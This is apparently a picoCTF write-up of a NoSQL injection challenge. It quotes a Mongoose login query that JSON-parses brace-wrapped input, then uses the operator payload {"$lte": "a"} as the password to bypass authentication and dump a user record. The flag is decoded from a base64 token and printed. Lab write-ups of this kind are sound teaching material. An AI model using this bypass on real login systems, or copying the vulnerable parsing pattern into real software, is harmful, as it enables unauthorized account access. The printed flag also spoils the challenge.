There is a code snippet in the source code:

```
    const users = await User.find({
      email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
      password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password
    });
```


For the email I used the default user that is embedded in the source code:

```
    const newUser = new User({
      firstName: "Josh",
      lastName: "Iriya",
      email: "joshiriya355@mumbama.com",
      password: process.env.NEXT_PUBLIC_PASSWORD as string
    });
```


The problem is, we don't know its password. I tried custom crafting JSON objects that could be parsed to bypass the control.

We do know that the program uses Mongoose. I read its and also JavaScript's JSON.parse's documentation:

- https://mongoosejs.com/docs/queries.html
- https://masteringjs.io/tutorials/mongoose/find
- https://mongoosejs.com/docs/api/model.html#Model.find()
- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse
- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON


Then I opened a node shell in my terminal and tried to craft the object. This one succeeded:
```
> JSON.parse("{ \"$lte\": \"a\" }")

{ '$lte': 'a' }
```


I used the email above with `{ \"$lte\": \"a\" }` as the password. It gave me this response:

`[{"_id":"65f08cf30112a251482f8d60","email":"joshiriya355@mumbama.com","firstName":"Josh","lastName":"Iriya","password":"Je80T8M7sUA","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uX2EyZTBkOWVmfQ==","__v":0}]`


I suspected that the token is the flag because of this line in user.ts:

  `token: { type: String, required: false ,default: "{{Flag}}"},`


Submitting the token in `picoCTF{}` flag format was not correct, then I tried base64 and found the flag:

`picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_a2e0d9ef}`
